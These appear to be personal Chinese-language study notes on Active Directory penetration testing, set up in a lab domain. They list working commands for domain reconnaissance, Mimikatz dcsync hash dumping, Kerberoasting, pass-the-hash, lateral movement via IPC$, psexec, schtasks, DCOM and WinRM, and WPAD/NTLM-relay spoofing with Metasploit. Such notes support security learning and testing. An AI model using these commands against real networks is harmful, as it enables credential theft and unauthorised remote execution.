### 用户信息

> 这部分不太复杂，就不放图了，当个备忘录记一下

|指令|功能|
|:-:|:-:|
|net user /domain|查看域内用户|
|net group "domain admins" /domain|查看域管|
|net time /domain|时间服务器\|DNS 一般都是DC|
|nslookup -type=all \_ldap.\_tcp.dc._msdcs.xxcom.local|查询dns|
|net group "domain controllers" /domain|查看域控|
|query user \|\| qwinsta|查看在线用户|

每个查找的都能有许多方法（例如DNS的），就不重复记录了

### 内网主机发现

> 这边多是主机命令操作，整理一下直接搬了

`net view`报错6118问题，需要手动开启 `SMB 1.0/CIFS` 文件共享支持。
顺带提及一下 CIFS ，CIFS即 Common Internet File System，像SMB协议一样，CIFS在高层运行（不像TCP/IP运行在底层），可以将其看作HTTP或者FTP那样的协议。具体看[文章](https://www.cnblogs.com/jinanxiaolaohu/p/10550061.html)

|指令|功能|
|:-:|:-:|
|net view|查看共享资料|
|arp -a|查看arp表|
|ipconfig /displaydns|查看dns缓存|
|nmap nbtscan...(顺手就行~)|工具扫描|
|type c:\Windows\system32\drivers\etc\hosts|查看hosts文件|

#### Mimikatz工具

> 万能的猕猴桃

为啥用Mimikatz能直接dump呢，搬运一下wing仔翻译的文章：

> Mimikatz有一个功能（dcsync），它利用目录复制服务（DRS）从NTDS.DIT文件中检索密码哈希值。这样子解决了需要直接使用域控制器进行身份验证的需要，因为它可以从域管理员的上下文中获得执行权限。因此它是红队的基本操作，因为它不那么复杂。

`mimikatz.exe privilege::debug "lsadump::dcsync /domain:xxcom.local /all /csv" exit`

![image](https://github.com/chriskaliX/AD-Pentest-Notes/raw/master/imgs/mimikatz_ntds.png)

### Access Token

> 基础篇过了一次，实操的时候摸过了，用 msf 下的 incognito。getsystem也是去搜寻可用的令牌进行提权

### Kerberosting

> 这个之前看到，但是没有认真看一下

#### 相关原理

因为看过Kerberos协议，结合蓝军文章可以简单理解。在Kerberos第二阶段（即与TGS通信）完成时会返回一张ST，ST使用Server端的（当时我说是NLTM Hash）密码进行加密。当 Kerberos 协议设置票据为 **RC4** 方式时，我们就可以通过爆破在Client端获取的票据ST，获取对应的Server端的密码。（学到了，很开心）

#### 实操

首先安装一个 `mssql` ，注册 spn 服务，`setspn -A MSSQLSvc/web.xxcom.local xxcom\web`，注意需要为本地管理员权限，否则会提示权限不足
![image](https://github.com/chriskaliX/AD-Pentest-Notes/raw/master/imgs/spn_reg.png)

先查询 SPN，上面已经介绍过，查询看到刚刚注册的 MSSQL
![image](https://github.com/chriskaliX/AD-Pentest-Notes/raw/master/imgs/spn_query.png)

运行Add-type时报错，其实为缺少依赖，为了节省时间直接换到DC上去操作

![image](https://github.com/chriskaliX/AD-Pentest-Notes/raw/master/imgs/spn_error.png)

```powershell
$SPNName="MSSQLSvc/web.xxcom.local"
Add-Type -AssemblyNAme System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $SPNName
```

![image](https://github.com/chriskaliX/AD-Pentest-Notes/raw/master/imgs/spn_klist.png)

在 `mimikatz` 中运行 `kerberos::list /export`

![image](https://github.com/chriskaliX/AD-Pentest-Notes/raw/master/imgs/klist_mimikatz.png)

之后跑的工具为 `tgsrepcrack.py` ，在[这里](https://github.com/nidem/kerberoast)下载就行

`python tgsrepcrack.py wordlist xxxxxx` 即可

### 密码喷射

蓝军文章是kerbrute，可以爆破用户，也可以密码喷射...工具下载ing，先看下面

## 0x06 横向移动

### 账号密码连接

#### IPC

> 从[这个博客](https://www.cnblogs.com/-mo-/p/11813608.html)搬运来一些东西，为了方便理解，仅供参考

IPC是共享”命名管道”的资源，它是为了让进程间通信而开放的命名管道，可以通过验证用户名和密码获得相应的权限,在远程管理计算机和查看计算机的共享资源时使用。利用`IPC$`,连接者甚至可以与目标主机建立一个连接，利用这个连接，连接者可以得到目标主机上的目录结构、用户列表等信息。利用条件：

1. 139,445端口开启
2. 管理员开启默认共享

`net use \\1.1.1.1\ipc$ "password" /user:username`
![image](https://github.com/chriskaliX/AD-Pentest-Notes/raw/master/imgs/ipc.png)

#### PSEXEC

> 20200729:今日有师傅了个问题，445横向的方法有哪些。发掘自己对与工具的理解还停留在表面，并未深入理解工具本身，特做补充和继续发掘

psexec是什么：详情看[百度百科](https://baike.baidu.com/item/psexec/9879597?fr=aladdin)，看完后我概括（搬运）一下。是一个轻型的telnet代替工具，可以在远程系统上执行程序，不过特征明显会报毒，同时会产生大量日志。msf下也有对应的模块，搜索关键字即可
命令为：`psexec \\target -accepteula -u username -p password cmd.exe`

##### 执行原理和过程

PSEXEC执行分为以下几个步骤

1. 通过IPC$链接，然后释放psexesvc.exe到目标主机
2. OpenSCManager打开句柄，CreateService创建服务，StartService启动服务（这里有一篇2008年逆向PSEXEC的[文章](http://blog.chinaunix.net/uid-7461242-id-2051697.html)）
3. 客户端连接并且执行命令，服务端启动相应程序并执行回显
![image](https://github.com/chriskaliX/AD-Pentest-Notes/raw/master/imgs/psexec_start.png)
![image](https://github.com/chriskaliX/AD-Pentest-Notes/raw/master/imgs/psexec_file.png)

所以明白了传统PSEXEC的缺点，即特征明显（而且确实比较老了
但是在没有防护设备的情况下，这个确实很方便（毕竟cs里面也内置了psexec作为横向的工具

#### wmi

> 刚好记得，前几天360团队掏出了一个[wmihacker](https://github.com/360-Linton-Lab/WMIHACKER)，玩了一下觉得挺好滴

其实看下helper就会用了

![image](https://github.com/chriskaliX/AD-Pentest-Notes/raw/master/imgs/wmihacker_usage.png)

挺好使
![image](https://github.com/chriskaliX/AD-Pentest-Notes/raw/master/imgs/wmihacker.png)

或者用自带的wmic也行

#### schtasks

定时任务，直接搬运指令作为记录

```powershell
schtasks /create /s 1.1.1.1 /u domain\Administrator /p password /ru "SYSTEM"  /tn "windowsupdate" /sc DAILY  /tr "calc" /F

schtasks /run /s 1.1.1.1 /u domain\Administrator /p password /tn windowsupdate
```

#### at

计划任务，也没啥好说滴
`at \\1.1.1.1 15:15 calc`

#### sc

sc.exe是一个命令行下管理本机或远程主机服务的工具，具体看 help ~

#### DCOM

> 20200804 - 中间做开发去了，回来慢慢填坑

首先还是老样子，什么是DCOM？（看完之后去搬运了一点点）DCOM即（Distributed Component Object Module）分布式组件对象模型，是一系列微软的概念和程序接口(当然一看就是基于COM的)，通过DCOM，客户端程序对象能够向网络中的另外一台计算机的程序对象发起请求。
同时发现三好学生师傅的[博文](https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-%E5%88%A9%E7%94%A8DCOM%E5%9C%A8%E8%BF%9C%E7%A8%8B%E7%B3%BB%E7%BB%9F%E6%89%A7%E8%A1%8C%E7%A8%8B%E5%BA%8F/)里也有了，拜读完之后默默补上...因为文章中的操作涉及到Powershell的版本问题，这里先抛出Powershell查询版本的语句：`$PSVersionTable.PSVersion`\# 商业转载请联系作者获得授权，非商业转载请注明出处。

```powershell
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","127.0.0.1"))
$com.Document.ActiveView.ExecuteShellCommand("cmd.exe",$null,"/c calc.exe","")
```

此命令为本地命令执行，在实际运用的时候，需要先建立 $IPC 连接，替换127.0.0.1和要执行的命令即可

#### **WinRM**

> WinRM（Windows Remote Management）即windows远程管理，基于Web服务管理。感觉就像是SSH ~

用账号密码即可远程连接，我本地配置的时候有点问题（设置了TrustedHosts还是不成功...），所以先记录一下指令
`winrs -r:http://targetip:5985 -u:Administrator -p:password "whoami"`
一般来说，5985是http，5986是https

### PTH

> PTH在讲NTLM认证的时候已经阐述过了，这里主要是传递的方式，这部分之前复现过了。和PTH紧密相关的是KB2871997这个补丁，但是sid为500的管理员账户仍可进行PTH，也可以使用AES-256密钥进行PTH攻击
> 20200921更新:刚打完h*，这回运用到了smb beacon和工作组下的pth。在cs下，工作组的pth填写时，domain值是任意的，不填也可以，之前一直认为要填写主机名或者workgroup，后来想了想在工作组环境下不是直接就行了（参考SMB爆破）。

#### impacket

#### Invoke-TheHash

#### Mimikatz使用

```mimikatz
privilege::debug
sekurlsa::pth /user:dc /domain:xxcom.local /ntlm:xxxx
```

~~msf和cs下，之后放上来~~

### NTLM-Relay

> 这个之前摸过了，感觉这种情况实际用的比较少，算是比较被动的方式~觉得主要围绕Responder这个工具展开，之前玩了一圈，好像没写文章发出来，这里就稍做记录吧...

#### 攻击手法1

Responder -b 强制开启401认证，触发场景就是用户访问一个网站，弹出小框框，在内网下捕获（总觉得挺明显的）

#### 攻击手法1.1

> 这个没看过，看了介绍就是因为都能控制PAC了，那直接让用户流量走我们的机器过...（PS 非域内）

~~这个还没手动做过，又mark一下~~

msf指令

```msf
use auxiliary/spoof/nbns/nbns_response
set regex WPAD
set spoofip attackip
run
use auxiliary/server/wpad
set proxy 172.16.127.155
run
```

#### 攻击手法2.0

> 这个挺有意思的，mark一下 -> responder关闭smb，开启ntlmrelayx.py，做ntlm-relay